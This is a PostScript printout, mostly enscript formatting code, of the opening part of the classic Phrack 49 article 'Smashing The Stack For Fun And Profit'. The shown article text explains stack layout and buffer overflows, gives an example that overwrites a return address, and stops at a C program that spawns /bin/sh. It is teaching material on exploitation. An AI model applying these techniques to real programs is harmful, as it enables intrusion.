%!PS-Adobe-3.0
%%BoundingBox: 24 24 571 818
%%Title: Enscript Output
%%For: Henrik KramshÃ¸j
%%Creator: GNU enscript 1.6.4
%%CreationDate: Wed Mar 15 17:30:14 2006
%%Orientation: Landscape
%%Pages: (atend)
%%DocumentMedia: A4 595 842 0 () ()
%%DocumentNeededResources: (atend)
%%EndComments
%%BeginProlog
%%BeginResource: procset Enscript-Prolog 1.6 4
%
% Procedures.
%

/_S {	% save current state
  /_s save def
} def
/_R {	% restore from saved state
  _s restore
} def

/S {	% showpage protecting gstate
  gsave
  showpage
  grestore
} bind def

/MF {	% fontname newfontname -> -	make a new encoded font
  /newfontname exch def
  /fontname exch def

  /fontdict fontname findfont def
  /newfont fontdict maxlength dict def

  fontdict {
    exch
    dup /FID eq {
      % skip FID pair
      pop pop
    } {
      % copy to the new font dictionary
      exch newfont 3 1 roll put
    } ifelse
  } forall

  newfont /FontName newfontname put

  % insert only valid encoding vectors
  encoding_vector length 256 eq {
    newfont /Encoding encoding_vector put
  } if

  newfontname newfont definefont pop
} def

/MF_PS { % fontname newfontname -> -	make a new font preserving its enc
  /newfontname exch def
  /fontname exch def

  /fontdict fontname findfont def
  /newfont fontdict maxlength dict def

  fontdict {
    exch
    dup /FID eq {
      % skip FID pair
      pop pop
    } {
      % copy to the new font dictionary
      exch newfont 3 1 roll put
    } ifelse
  } forall

  newfont /FontName newfontname put

  newfontname newfont definefont pop
} def

/SF { % fontname width height -> -	set a new font
  /height exch def
  /width exch def

  findfont
  [width 0 0 height 0 0] makefont setfont
} def

/SUF { % fontname width height -> -	set a new user font
  /height exch def
  /width exch def

  /F-gs-user-font MF
  /F-gs-user-font width height SF
} def

/SUF_PS { % fontname width height -> -	set a new user font preserving its enc
  /height exch def
  /width exch def

  /F-gs-user-font MF_PS
  /F-gs-user-font width height SF
} def

/M {moveto} bind def
/s {show} bind def

/Box {	% x y w h -> -			define box path
  /d_h exch def /d_w exch def /d_y exch def /d_x exch def
  d_x d_y  moveto
  d_w 0 rlineto
  0 d_h rlineto
  d_w neg 0 rlineto
  closepath
} def

/bgs {	% x y height blskip gray str -> -	show string with bg color
  /str exch def
  /gray exch def
  /blskip exch def
  /height exch def
  /y exch def
  /x exch def

  gsave
    x y blskip sub str stringwidth pop height Box
    gray setgray
    fill
  grestore
  x y M str s
} def

/bgcs { % x y height blskip red green blue str -> -  show string with bg color
  /str exch def
  /blue exch def
  /green exch def
  /red exch def
  /blskip exch def
  /height exch def
  /y exch def
  /x exch def

  gsave
    x y blskip sub str stringwidth pop height Box
    red green blue setrgbcolor
    fill
  grestore
  x y M str s
} def

% Highlight bars.
/highlight_bars {	% nlines lineheight output_y_margin gray -> -
  gsave
    setgray
    /ymarg exch def
    /lineheight exch def
    /nlines exch def

    % This 2 is just a magic number to sync highlight lines to text.
    0 d_header_y ymarg sub 2 sub translate

    /cw d_output_w cols div def
    /nrows d_output_h ymarg 2 mul sub lineheight div cvi def

    % for each column
    0 1 cols 1 sub {
      cw mul /xp exch def

      % for each rows
      0 1 nrows 1 sub {
        /rn exch def
        rn lineheight mul neg /yp exch def
        rn nlines idiv 2 mod 0 eq {
	  % Draw highlight bar.  4 is just a magic indentation.
	  xp 4 add yp cw 8 sub lineheight neg Box fill
	} if
      } for
    } for

  grestore
} def

% Line highlight bar.
/line_highlight {	% x y width height gray -> -
  gsave
    /gray exch def
    Box gray setgray fill
  grestore
} def

% Column separator lines.
/column_lines {
  gsave
    .1 setlinewidth
    0 d_footer_h translate
    /cw d_output_w cols div def
    1 1 cols 1 sub {
      cw mul 0 moveto
      0 d_output_h rlineto stroke
    } for
  grestore
} def

% Column borders.
/column_borders {
  gsave
    .1 setlinewidth
    0 d_footer_h moveto
    0 d_output_h rlineto
    d_output_w 0 rlineto
    0 d_output_h neg rlineto
    closepath stroke
  grestore
} def

% Do the actual underlay drawing
/draw_underlay {
  ul_style 0 eq {
    ul_str true charpath stroke
  } {
    ul_str show
  } ifelse
} def

% Underlay
/underlay {	% - -> -
  gsave
    0 d_page_h translate
    d_page_h neg d_page_w atan rotate

    ul_gray setgray
    ul_font setfont
    /dw d_page_h dup mul d_page_w dup mul add sqrt def
    ul_str stringwidth pop dw exch sub 2 div ul_h_ptsize -2 div moveto
    draw_underlay
  grestore
} def

/user_underlay {	% - -> -
  gsave
    ul_x ul_y translate
    ul_angle rotate
    ul_gray setgray
    ul_font setfont
    0 0 ul_h_ptsize 2 div sub moveto
    draw_underlay
  grestore
} def

% Page prefeed
/page_prefeed {		% bool -> -
  statusdict /prefeed known {
    statusdict exch /prefeed exch put
  } {
    pop
  } ifelse
} def

% Wrapped line markers
/wrapped_line_mark {	% x y charwith charheight type -> -
  /type exch def
  /h exch def
  /w exch def
  /y exch def
  /x exch def

  type 2 eq {
    % Black boxes (like TeX does)
    gsave
      0 setlinewidth
      x w 4 div add y M
      0 h rlineto w 2 div 0 rlineto 0 h neg rlineto
      closepath fill
    grestore
  } {
    type 3 eq {
      % Small arrows
      gsave
        .2 setlinewidth
        x w 2 div add y h 2 div add M
        w 4 div 0 rlineto
        x w 4 div add y lineto stroke

        x w 4 div add w 8 div add y h 4 div add M
        x w 4 div add y lineto
	w 4 div h 8 div rlineto stroke
      grestore
    } {
      % do nothing
    } ifelse
  } ifelse
} def

% EPSF import.

/BeginEPSF {
  /b4_Inc_state save def    		% Save state for cleanup
  /dict_count countdictstack def	% Count objects on dict stack
  /op_count count 1 sub def		% Count objects on operand stack
  userdict begin
  /showpage { } def
  0 setgray 0 setlinecap
  1 setlinewidth 0 setlinejoin
  10 setmiterlimit [ ] 0 setdash newpath
  /languagelevel where {
    pop languagelevel
    1 ne {
      false setstrokeadjust false setoverprint
    } if
  } if
} bind def

/EndEPSF {
  count op_count sub { pos } repeat	% Clean up stacks
  countdictstack dict_count sub { end } repeat
  b4_Inc_state restore
} bind def

% Check PostScript language level.
/languagelevel where {
  pop /gs_languagelevel languagelevel def
} {
  /gs_languagelevel 1 def
} ifelse
%%EndResource
%%BeginResource: procset Enscript-Encoding-88591 1.6 4
/encoding_vector [
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/space        	/exclam       	/quotedbl     	/numbersign   	
/dollar       	/percent      	/ampersand    	/quoteright   	
/parenleft    	/parenright   	/asterisk     	/plus         	
/comma        	/hyphen       	/period       	/slash        	
/zero         	/one          	/two          	/three        	
/four         	/five         	/six          	/seven        	
/eight        	/nine         	/colon        	/semicolon    	
/less         	/equal        	/greater      	/question     	
/at           	/A            	/B            	/C            	
/D            	/E            	/F            	/G            	
/H            	/I            	/J            	/K            	
/L            	/M            	/N            	/O            	
/P            	/Q            	/R            	/S            	
/T            	/U            	/V            	/W            	
/X            	/Y            	/Z            	/bracketleft  	
/backslash    	/bracketright 	/asciicircum  	/underscore   	
/quoteleft    	/a            	/b            	/c            	
/d            	/e            	/f            	/g            	
/h            	/i            	/j            	/k            	
/l            	/m            	/n            	/o            	
/p            	/q            	/r            	/s            	
/t            	/u            	/v            	/w            	
/x            	/y            	/z            	/braceleft    	
/bar          	/braceright   	/tilde        	/.notdef      	
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/.notdef      	/.notdef      	/.notdef      	/.notdef      	
/space        	/exclamdown   	/cent         	/sterling     	
/currency     	/yen          	/brokenbar    	/section      	
/dieresis     	/copyright    	/ordfeminine  	/guillemotleft	
/logicalnot   	/hyphen       	/registered   	/macron       	
/degree       	/plusminus    	/twosuperior  	/threesuperior	
/acute        	/mu           	/paragraph    	/bullet       	
/cedilla      	/onesuperior  	/ordmasculine 	/guillemotright	
/onequarter   	/onehalf      	/threequarters	/questiondown 	
/Agrave       	/Aacute       	/Acircumflex  	/Atilde       	
/Adieresis    	/Aring        	/AE           	/Ccedilla     	
/Egrave       	/Eacute       	/Ecircumflex  	/Edieresis    	
/Igrave       	/Iacute       	/Icircumflex  	/Idieresis    	
/Eth          	/Ntilde       	/Ograve       	/Oacute       	
/Ocircumflex  	/Otilde       	/Odieresis    	/multiply     	
/Oslash       	/Ugrave       	/Uacute       	/Ucircumflex  	
/Udieresis    	/Yacute       	/Thorn        	/germandbls   	
/agrave       	/aacute       	/acircumflex  	/atilde       	
/adieresis    	/aring        	/ae           	/ccedilla     	
/egrave       	/eacute       	/ecircumflex  	/edieresis    	
/igrave       	/iacute       	/icircumflex  	/idieresis    	
/eth          	/ntilde       	/ograve       	/oacute       	
/ocircumflex  	/otilde       	/odieresis    	/divide       	
/oslash       	/ugrave       	/uacute       	/ucircumflex  	
/udieresis    	/yacute       	/thorn        	/ydieresis    	
] def
%%EndResource
%%EndProlog
%%BeginSetup
%%IncludeResource: font Courier-Bold
%%IncludeResource: font Courier
/HFpt_w 10 def
/HFpt_h 10 def
/Courier-Bold /HF-gs-font MF
/HF /HF-gs-font findfont [HFpt_w 0 0 HFpt_h 0 0] makefont def
/Courier /F-gs-font MF
/F-gs-font 7 7 SF
/#copies 1 def
% Pagedevice definitions:
gs_languagelevel 1 gt {
  <<
    /PageSize [595 842] 
  >> setpagedevice
} if
%%BeginResource: procset Enscript-Header-simple 1.6 4

/do_header {	% print default simple header
  gsave
    d_header_x d_header_y HFpt_h 3 div add translate

    HF setfont
    user_header_p {
      5 0 moveto user_header_left_str show

      d_header_w user_header_center_str stringwidth pop sub 2 div
      0 moveto user_header_center_str show

      d_header_w user_header_right_str stringwidth pop sub 5 sub
      0 moveto user_header_right_str show
    } {
      5 0 moveto fname show
      45 0 rmoveto fmodstr show
      45 0 rmoveto pagenumstr show
    } ifelse

  grestore
} def
%%EndResource
/d_page_w 794 def
/d_page_h 547 def
/d_header_x 0 def
/d_header_y 532 def
/d_header_w 794 def
/d_header_h 15 def
/d_footer_x 0 def
/d_footer_y 0 def
/d_footer_w 794 def
/d_footer_h 0 def
/d_output_w 794 def
/d_output_h 532 def
/cols 2 def
%%EndSetup
%%Page: (1) 1
%%BeginPageSetup
_S
90 rotate
24 -571 translate
/pagenum 1 def
/fname (smashstack.txt) def
/fdir () def
/ftail (smashstack.txt) def
% User defined strings:
/fmodstr (Wed Mar 15 17:26:04 2006) def
/pagenumstr (1) def
/user_header_p false def
/user_footer_p false def
%%EndPageSetup
do_header
5 522 M
(                               .oO Phrack 49 Oo.) s
5 506 M
(                          Volume Seven, Issue Forty-Nine) s
5 498 M
(                                     ) s
5 490 M
(                                  File 14 of 16) s
5 474 M
(                      BugTraq, r00t, and Underground.Org) s
5 466 M
(                                   bring you) s
5 450 M
(                     XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX) s
5 442 M
(                     Smashing The Stack For Fun And Profit) s
5 434 M
(                     XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX) s
5 418 M
(                                 by Aleph One) s
5 410 M
(                             aleph1@underground.org) s
5 394 M
(        `smash the stack` [C programming] n. On many C implementations) s
5 386 M
(        it is possible to corrupt the execution stack by writing past) s
5 378 M
(        the end of an array declared auto in a routine.  Code that does) s
5 370 M
(        this is said to smash the stack, and can cause return from the) s
5 362 M
(        routine to jump to a random address.  This can produce some of) s
5 354 M
(        the most insidious data-dependent bugs known to mankind.) s
5 346 M
(        Variants include trash the stack, scribble the stack, mangle) s
5 338 M
(        the stack; the term mung the stack is not used, as this is) s
5 330 M
(        never done intentionally. See spam; see also alias bug,) s
5 322 M
(        fandango on core, memory leak, precedence lossage, overrun screw.) s
5 298 M
(                                 Introduction) s
5 290 M
(                                 ~~~~~~~~~~~~) s
5 274 M
(   Over the last few months there has been a large increase of buffer) s
5 266 M
(overflow vulnerabilities being both discovered and exploited.  Examples) s
5 258 M
(of these are syslog, splitvt, sendmail 8.7.5, Linux/FreeBSD mount, Xt ) s
5 250 M
(library, at, etc.  This paper attempts to explain what buffer overflows ) s
5 242 M
(are, and how their exploits work.) s
5 226 M
(   Basic knowledge of assembly is required.  An understanding of virtual ) s
5 218 M
(memory concepts, and experience with gdb are very helpful but not necessary.) s
5 210 M
(We also assume we are working with an Intel x86 CPU, and that the operating ) s
5 202 M
(system is Linux.) s
5 186 M
(   Some basic definitions before we begin: A buffer is simply a contiguous ) s
5 178 M
(block of computer memory that holds multiple instances of the same data ) s
5 170 M
(type.  C programmers normally associate with the word buffer arrays. Most ) s
5 162 M
(commonly, character arrays.  Arrays, like all variables in C, can be ) s
5 154 M
(declared either static or dynamic.  Static variables are allocated at load ) s
5 146 M
(time on the data segment.  Dynamic variables are allocated at run time on ) s
5 138 M
(the stack. To overflow is to flow, or fill over the top, brims, or bounds. ) s
5 130 M
(We will concern ourselves only with the overflow of dynamic buffers, otherwise) s
5 122 M
(known as stack-based buffer overflows.) s
5 98 M
(                          Process Memory Organization) s
5 90 M
(                          ~~~~~~~~~~~~~~~~~~~~~~~~~~~) s
5 74 M
(   To understand what stack buffers are we must first understand how a) s
5 66 M
(process is organized in memory.  Processes are divided into three regions:) s
5 58 M
(Text, Data, and Stack.  We will concentrate on the stack region, but first) s
5 50 M
(a small overview of the other regions is in order.) s
5 34 M
(   The text region is fixed by the program and includes code \(instructions\)) s
5 26 M
(and read-only data.  This region corresponds to the text section of the) s
5 18 M
(executable file.  This region is normally marked read-only and any attempt to) s
5 10 M
(write to it will result in a segmentation violation.) s
402 522 M
(   The data region contains initialized and uninitialized data.  Static) s
402 514 M
(variables are stored in this region.  The data region corresponds to the) s
402 506 M
(data-bss sections of the executable file.  Its size can be changed with the) s
402 498 M
(brk\(2\) system call.  If the expansion of the bss data or the user stack) s
402 490 M
(exhausts available memory, the process is blocked and is rescheduled to) s
402 482 M
(run again with a larger memory space. New memory is added between the data) s
402 474 M
(and stack segments.) s
402 458 M
(                             /------------------\\  lower) s
402 450 M
(                             |                  |  memory) s
402 442 M
(                             |       Text       |  addresses) s
402 434 M
(                             |                  |) s
402 426 M
(                             |------------------|) s
402 418 M
(                             |   \(Initialized\)  |) s
402 410 M
(                             |        Data      |) s
402 402 M
(                             |  \(Uninitialized\) |) s
402 394 M
(                             |------------------|) s
402 386 M
(                             |                  |) s
402 378 M
(                             |       Stack      |  higher) s
402 370 M
(                             |                  |  memory) s
402 362 M
(                             \\------------------/  addresses) s
402 346 M
(                         Fig. 1 Process Memory Regions) s
402 322 M
(                               What Is A Stack?) s
402 314 M
(                               ~~~~~~~~~~~~~~~~) s
402 298 M
(   A stack is an abstract data type frequently used in computer science.  A) s
402 290 M
(stack of objects has the property that the last object placed on the stack) s
402 282 M
(will be the first object removed.  This property is commonly referred to as) s
402 274 M
(last in, first out queue, or a LIFO.) s
402 258 M
(   Several operations are defined on stacks.  Two of the most important are) s
402 250 M
(PUSH and POP.  PUSH adds an element at the top of the stack.  POP, in ) s
402 242 M
(contrast, reduces the stack size by one by removing the last element at the ) s
402 234 M
(top of the stack.) s
402 210 M
(                            Why Do We Use A Stack?) s
402 202 M
(                            ~~~~~~~~~~~~~~~~~~~~~~) s
402 186 M
(   Modern computers are designed with the need of high-level languages in) s
402 178 M
(mind.  The most important technique for structuring programs introduced by) s
402 170 M
(high-level languages is the procedure or function.  From one point of view, a) s
402 162 M
(procedure call alters the flow of control just as a jump does, but unlike a) s
402 154 M
(jump, when finished performing its task, a function returns control to the ) s
402 146 M
(statement or instruction following the call.  This high-level abstraction) s
402 138 M
(is implemented with the help of the stack.) s
402 122 M
(  The stack is also used to dynamically allocate the local variables used in) s
402 114 M
(functions, to pass parameters to the functions, and to return values from the) s
402 106 M
(function.) s
402 82 M
(                               The Stack Region) s
402 74 M
(                               ~~~~~~~~~~~~~~~~) s
402 58 M
(   A stack is a contiguous block of memory containing data.  A register called) s
402 50 M
(the stack pointer \(SP\) points to the top of the stack.  The bottom of the ) s
402 42 M
(stack is at a fixed address.  Its size is dynamically adjusted by the kernel ) s
402 34 M
(at run time. The CPU implements instructions to PUSH onto and POP off of the ) s
402 26 M
(stack. ) s
402 10 M
(   The stack consists of logical stack frames that are pushed when calling a) s
402 2 M
(function and popped when returning.  A stack frame contains the parameters to ) s
_R
S
%%Page: (2) 2
%%BeginPageSetup
_S
90 rotate
24 -571 translate
/pagenum 2 def
/fname (smashstack.txt) def
/fdir () def
/ftail (smashstack.txt) def
% User defined strings:
/fmodstr (Wed Mar 15 17:26:04 2006) def
/pagenumstr (2) def
/user_header_p false def
/user_footer_p false def
%%EndPageSetup
do_header
5 522 M
(a function, its local variables, and the data necessary to recover the ) s
5 514 M
(previous stack frame, including the value of the instruction pointer at the ) s
5 506 M
(time of the function call.) s
5 490 M
(   Depending on the implementation the stack will either grow down \(towards) s
5 482 M
(lower memory addresses\), or up.  In our examples we'll use a stack that grows) s
5 474 M
(down.  This is the way the stack grows on many computers including the Intel, ) s
5 466 M
(Motorola, SPARC and MIPS processors.  The stack pointer \(SP\) is also) s
5 458 M
(implementation dependent.  It may point to the last address on the stack, or ) s
5 450 M
(to the next free available address after the stack.  For our discussion we'll) s
5 442 M
(assume it points to the last address on the stack.) s
5 426 M
(   In addition to the stack pointer, which points to the top of the stack) s
5 418 M
(\(lowest numerical address\), it is often convenient to have a frame pointer) s
5 410 M
(\(FP\) which points to a fixed location within a frame.  Some texts also refer) s
5 402 M
(to it as a local base pointer \(LB\).  In principle, local variables could be) s
5 394 M
(referenced by giving their offsets from SP.  However, as words are pushed onto) s
5 386 M
(the stack and popped from the stack, these offsets change.  Although in some) s
5 378 M
(cases the compiler can keep track of the number of words on the stack and) s
5 370 M
(thus correct the offsets, in some cases it cannot, and in all cases) s
5 362 M
(considerable administration is required.  Futhermore, on some machines, such) s
5 354 M
(as Intel-based processors, accessing a variable at a known distance from SP) s
5 346 M
(requires multiple instructions.) s
5 330 M
(   Consequently, many compilers use a second register, FP, for referencing) s
5 322 M
(both local variables and parameters because their distances from FP do) s
5 314 M
(not change with PUSHes and POPs.  On Intel CPUs, BP \(EBP\) is used for this ) s
5 306 M
(purpose.  On the Motorola CPUs, any address register except A7 \(the stack ) s
5 298 M
(pointer\) will do.  Because the way our stack grows, actual parameters have ) s
5 290 M
(positive offsets and local variables have negative offsets from FP.) s
5 274 M
(   The first thing a procedure must do when called is save the previous FP) s
5 266 M
(\(so it can be restored at procedure exit\).  Then it copies SP into FP to ) s
5 258 M
(create the new FP, and advances SP to reserve space for the local variables. ) s
5 250 M
(This code is called the procedure prolog.  Upon procedure exit, the stack ) s
5 242 M
(must be cleaned up again, something called the procedure epilog.  The Intel ) s
5 234 M
(ENTER and LEAVE instructions and the Motorola LINK and UNLINK instructions, ) s
5 226 M
(have been provided to do most of the procedure prolog and epilog work ) s
5 218 M
(efficiently. ) s
5 202 M
(   Let us see what the stack looks like in a simple example:) s
5 186 M
(example1.c:) s
5 178 M
(------------------------------------------------------------------------------) s
5 170 M
(void function\(int a, int b, int c\) {) s
5 162 M
(   char buffer1[5];) s
5 154 M
(   char buffer2[10];) s
5 146 M
(}) s
5 130 M
(void main\(\) {) s
5 122 M
(  function\(1,2,3\);) s
5 114 M
(}) s
5 106 M
(------------------------------------------------------------------------------) s
5 90 M
(   To understand what the program does to call function\(\) we compile it with) s
5 82 M
(gcc using the -S switch to generate assembly code output:) s
5 66 M
($ gcc -S -o example1.s example1.c) s
5 50 M
(   By looking at the assembly language output we see that the call to) s
5 42 M
(function\(\) is translated to:) s
5 26 M
(        pushl $3) s
5 18 M
(        pushl $2) s
5 10 M
(        pushl $1) s
5 2 M
(        call function) s
402 514 M
(    This pushes the 3 arguments to function backwards into the stack, and) s
402 506 M
(calls function\(\).  The instruction 'call' will push the instruction pointer) s
402 498 M
(\(IP\) onto the stack.  We'll call the saved IP the return address \(RET\).  The) s
402 490 M
(first thing done in function is the procedure prolog:) s
402 474 M
(        pushl %ebp) s
402 466 M
(        movl %esp,%ebp) s
402 458 M
(        subl $20,%esp) s
402 442 M
(   This pushes EBP, the frame pointer, onto the stack.  It then copies the) s
402 434 M
(current SP onto EBP, making it the new FP pointer.  We'll call the saved FP) s
402 426 M
(pointer SFP.  It then allocates space for the local variables by subtracting) s
402 418 M
(their size from SP.) s
402 402 M
(   We must remember that memory can only be addressed in multiples of the) s
402 394 M
(word size.  A word in our case is 4 bytes, or 32 bits.  So our 5 byte buffer) s
402 386 M
(is really going to take 8 bytes \(2 words\) of memory, and our 10 byte buffer) s
402 378 M
(is going to take 12 bytes \(3 words\) of memory.  That is why SP is being) s
402 370 M
(subtracted by 20.  With that in mind our stack looks like this when) s
402 362 M
(function\(\) is called \(each space represents a byte\):) s
402 338 M
(bottom of                                                            top of) s
402 330 M
(memory                                                               memory) s
402 322 M
(           buffer2       buffer1   sfp   ret   a     b     c) s
402 314 M
(<------   [            ][        ][    ][    ][    ][    ][    ]) s
402 306 M
(           ) s
402 298 M
(top of                                                            bottom of) s
402 290 M
(stack                                                                 stack) s
402 266 M
(                               Buffer Overflows) s
402 258 M
(                               ~~~~~~~~~~~~~~~~) s
402 242 M
(   A buffer overflow is the result of stuffing more data into a buffer than) s
402 234 M
(it can handle.  How can this often found programming error can be taken) s
402 226 M
(advantage to execute arbitrary code?  Lets look at another example:) s
402 210 M
(example2.c) s
402 202 M
(------------------------------------------------------------------------------) s
402 194 M
(void function\(char *str\) {) s
402 186 M
(   char buffer[16];) s
402 170 M
(   strcpy\(buffer,str\);) s
402 162 M
(}) s
402 146 M
(void main\(\) {) s
402 138 M
(  char large_string[256];) s
402 130 M
(  int i;) s
402 114 M
(  for\( i = 0; i < 255; i++\)) s
402 106 M
(    large_string[i] = 'A';) s
402 90 M
(  function\(large_string\);) s
402 82 M
(}) s
402 74 M
(------------------------------------------------------------------------------) s
402 58 M
(   This is program has a function with a typical buffer overflow coding) s
402 50 M
(error.  The function copies a supplied string without bounds checking by) s
402 42 M
(using strcpy\(\) instead of strncpy\(\).  If you run this program you will get a) s
402 34 M
(segmentation violation.  Lets see what its stack looks when we call function:) s
402 10 M
(bottom of                                                            top of) s
402 2 M
(memory                                                               memory) s
_R
S
%%Page: (3) 3
%%BeginPageSetup
_S
90 rotate
24 -571 translate
/pagenum 3 def
/fname (smashstack.txt) def
/fdir () def
/ftail (smashstack.txt) def
% User defined strings:
/fmodstr (Wed Mar 15 17:26:04 2006) def
/pagenumstr (3) def
/user_header_p false def
/user_footer_p false def
%%EndPageSetup
do_header
5 522 M
(                  buffer            sfp   ret   *str) s
5 514 M
(<------          [                ][    ][    ][    ]) s
5 498 M
(top of                                                            bottom of) s
5 490 M
(stack                                                                 stack) s
5 466 M
(   What is going on here?  Why do we get a segmentation violation?  Simple.) s
5 458 M
(strcpy\(\) is coping the contents of *str \(larger_string[]\) into buffer[]) s
5 450 M
(until a null character is found on the string.  As we can see buffer[] is) s
5 442 M
(much smaller than *str.  buffer[] is 16 bytes long, and we are trying to stuff) s
5 434 M
(it with 256 bytes.  This means that all 250 bytes after buffer in the stack) s
5 426 M
(are being overwritten.  This includes the SFP, RET, and even *str!  We had ) s
5 418 M
(filled large_string with the character 'A'.  It's hex character value) s
5 410 M
(is 0x41.  That means that the return address is now 0x41414141.  This is) s
5 402 M
(outside of the process address space.  That is why when the function returns) s
5 394 M
(and tries to read the next instruction from that address you get a ) s
5 386 M
(segmentation violation.) s
5 370 M
(   So a buffer overflow allows us to change the return address of a function.) s
5 362 M
(In this way we can change the flow of execution of the program.  Lets go back) s
5 354 M
(to our first example and recall what the stack looked like:) s
5 330 M
(bottom of                                                            top of) s
5 322 M
(memory                                                               memory) s
5 314 M
(           buffer2       buffer1   sfp   ret   a     b     c) s
5 306 M
(<------   [            ][        ][    ][    ][    ][    ][    ]) s
5 290 M
(top of                                                            bottom of) s
5 282 M
(stack                                                                 stack) s
5 258 M
(   Lets try to modify our first example so that it overwrites the return) s
5 250 M
(address, and demonstrate how we can make it execute arbitrary code.  Just) s
5 242 M
(before buffer1[] on the stack is SFP, and before it, the return address.) s
5 234 M
(That is 4 bytes pass the end of buffer1[].  But remember that buffer1[] is) s
5 226 M
(really 2 word so its 8 bytes long.  So the return address is 12 bytes from) s
5 218 M
(the start of buffer1[].  We'll modify the return value in such a way that the) s
5 210 M
(assignment statement 'x = 1;' after the function call will be jumped.  To do) s
5 202 M
(so we add 8 bytes to the return address.  Our code is now:) s
5 186 M
(example3.c:) s
5 178 M
(------------------------------------------------------------------------------) s
5 170 M
(void function\(int a, int b, int c\) {) s
5 162 M
(   char buffer1[5];) s
5 154 M
(   char buffer2[10];) s
5 146 M
(   int *ret;) s
5 130 M
(   ret = buffer1 + 12;) s
5 122 M
(   \(*ret\) += 8;) s
5 114 M
(}) s
5 98 M
(void main\(\) {) s
5 90 M
(  int x;) s
5 74 M
(  x = 0;) s
5 66 M
(  function\(1,2,3\);) s
5 58 M
(  x = 1;) s
5 50 M
(  printf\("%d\\n",x\);) s
5 42 M
(}) s
5 34 M
(------------------------------------------------------------------------------) s
5 18 M
(   What we have done is add 12 to buffer1[]'s address.  This new address is) s
5 10 M
(where the return address is stored.  We want to skip pass the assignment to) s
5 2 M
(the printf call.  How did we know to add 8 to the return address?  We used a) s
402 522 M
(test value first \(for example 1\), compiled the program, and then started gdb:) s
402 506 M
(------------------------------------------------------------------------------) s
402 498 M
([aleph1]$ gdb example3) s
402 490 M
(GDB is free software and you are welcome to distribute copies of it) s
402 482 M
( under certain conditions; type "show copying" to see the conditions.) s
402 474 M
(There is absolutely no warranty for GDB; type "show warranty" for details.) s
402 466 M
(GDB 4.15 \(i586-unknown-linux\), Copyright 1995 Free Software Foundation, Inc...) s
402 458 M
(\(no debugging symbols found\)...) s
402 450 M
(\(gdb\) disassemble main) s
402 442 M
(Dump of assembler code for function main:) s
402 434 M
(0x8000490 <main>:       pushl  %ebp) s
402 426 M
(0x8000491 <main+1>:     movl   %esp,%ebp) s
402 418 M
(0x8000493 <main+3>:     subl   $0x4,%esp) s
402 410 M
(0x8000496 <main+6>:     movl   $0x0,0xfffffffc\(%ebp\)) s
402 402 M
(0x800049d <main+13>:    pushl  $0x3) s
402 394 M
(0x800049f <main+15>:    pushl  $0x2) s
402 386 M
(0x80004a1 <main+17>:    pushl  $0x1) s
402 378 M
(0x80004a3 <main+19>:    call   0x8000470 <function>) s
402 370 M
(0x80004a8 <main+24>:    addl   $0xc,%esp) s
402 362 M
(0x80004ab <main+27>:    movl   $0x1,0xfffffffc\(%ebp\)) s
402 354 M
(0x80004b2 <main+34>:    movl   0xfffffffc\(%ebp\),%eax) s
402 346 M
(0x80004b5 <main+37>:    pushl  %eax) s
402 338 M
(0x80004b6 <main+38>:    pushl  $0x80004f8) s
402 330 M
(0x80004bb <main+43>:    call   0x8000378 <printf>) s
402 322 M
(0x80004c0 <main+48>:    addl   $0x8,%esp) s
402 314 M
(0x80004c3 <main+51>:    movl   %ebp,%esp) s
402 306 M
(0x80004c5 <main+53>:    popl   %ebp) s
402 298 M
(0x80004c6 <main+54>:    ret) s
402 290 M
(0x80004c7 <main+55>:    nop) s
402 282 M
(------------------------------------------------------------------------------) s
402 266 M
(   We can see that when calling function\(\) the RET will be 0x8004a8, and we) s
402 258 M
(want to jump past the assignment at 0x80004ab.  The next instruction we want) s
402 250 M
(to execute is the at 0x8004b2.  A little math tells us the distance is 8) s
402 242 M
(bytes.) s
402 218 M
(                                  Shell Code) s
402 210 M
(                                  ~~~~~~~~~~) s
402 194 M
(   So now that we know that we can modify the return address and the flow of) s
402 186 M
(execution, what program do we want to execute?  In most cases we'll simply) s
402 178 M
(want the program to spawn a shell.  From the shell we can then issue other) s
402 170 M
(commands as we wish.  But what if there is no such code in the program we) s
402 162 M
(are trying to exploit?  How can we place arbitrary instruction into its) s
402 154 M
(address space?  The answer is to place the code with are trying to execute in) s
402 146 M
(the buffer we are overflowing, and overwrite the return address so it points) s
402 138 M
(back into the buffer.  Assuming the stack starts at address 0xFF, and that S) s
402 130 M
(stands for the code we want to execute the stack would then look like this:) s
402 106 M
(bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of) s
402 98 M
(memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory) s
402 90 M
(           buffer                sfp   ret   a     b     c) s
402 74 M
(<------   [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]) s
402 66 M
(           ^                            |) s
402 58 M
(           |____________________________|) s
402 50 M
(top of                                                            bottom of) s
402 42 M
(stack                                                                 stack) s
402 18 M
(The code to spawn a shell in C looks like:) s
402 2 M
(shellcode.c) s
_R
S
%%Page: (4) 4
%%BeginPageSetup
_S
90 rotate
24 -571 translate
/pagenum 4 def
/fname (smashstack.txt) def
/fdir () def
/ftail (smashstack.txt) def
% User defined strings:
/fmodstr (Wed Mar 15 17:26:04 2006) def
/pagenumstr (4) def
/user_header_p false def
/user_footer_p false def
%%EndPageSetup
do_header
5 522 M
(-----------------------------------------------------------------------------) s
5 514 M
(#include <stdio.h>) s
5 498 M
(void main\(\) {) s
5 490 M
(   char *name[2];) s
5 474 M
(   name[0] = "/bin/sh";) s
5 466 M
(   name[1] = NULL;) s
5 458 M
(   execve\(name[0], name, NULL\);) s
5 450 M
(}) s
5 442 M
